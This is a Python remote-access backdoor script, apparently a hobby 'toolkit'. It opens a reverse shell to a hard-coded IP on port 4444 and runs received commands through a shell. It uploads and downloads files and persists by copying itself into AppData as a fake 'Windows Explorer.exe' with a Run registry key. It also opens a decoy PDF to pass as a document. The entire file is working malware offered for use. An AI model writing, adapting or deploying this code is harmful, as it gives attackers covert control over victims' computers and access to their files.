#!/usr/bin/env python

import socket, subprocess, os, json, base64, sys, shutil
import pyfiglet 
from termcolor import colored

banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print colored("=" * 60, "green")

class Backdoor:
	def __init__(self, ip, port):
		self.persistence()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
	
	#transfer data using json
	def reliable_send(self, data):
		json_data = json.dumps(data)
		self.connection.send(json_data)

	#recieve data using json
	def reliable_recieve(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
		
	#read files an encode as base64
	def read_files(self, path):
		with open(path, "rb") as file:
			return base64.b64encode(file.read())
	
	#write files 
	def write_file(self, path, content):
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful"
			print colored("==================================\n","yellow")
			
	#change working directory
	def change_working_dir_to(self, path):
		os.chdir(path)
		return "[+] working directory changed to " + path
		print colored("==================================", "yellow")
	
	#run persistence
	def persistence(self):
		persistence_location = os.environ["appdata"] + "\\Windows Explorer.exe"
		if not os.path.exists(persistence_location):
			shutil.copyfile(sys.executable, persistence_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + persistence_location + '"', shell=True)	
	
	#execute system command
	def execute_system_command(self, command):
		DEVNULL = open(os.devnull, "wb") #remove command prompt pop up when file is executed

		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)	
		print colored("[+] Connection established", "green")


	#run command
	def run(self):
		while True:
			command = self.reliable_recieve()

			file_name = sys._MEIPASS + "/sample.pdf" #run trojan as pdf
			subprocess.Popen(file_name, shell=True)

			try: 			
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_dir_to(command[1])
				elif command[0] == "download":
					command_result = self.read_files(command[1])
				else:
					command_result = self.execute_system_command(command)
		
			except Exception:
				result = "[-] Error during command execution"

			self.reliable_send(command_result)
		
backdoor = Backdoor("192.168.43.106", 4444)
backdoor.run()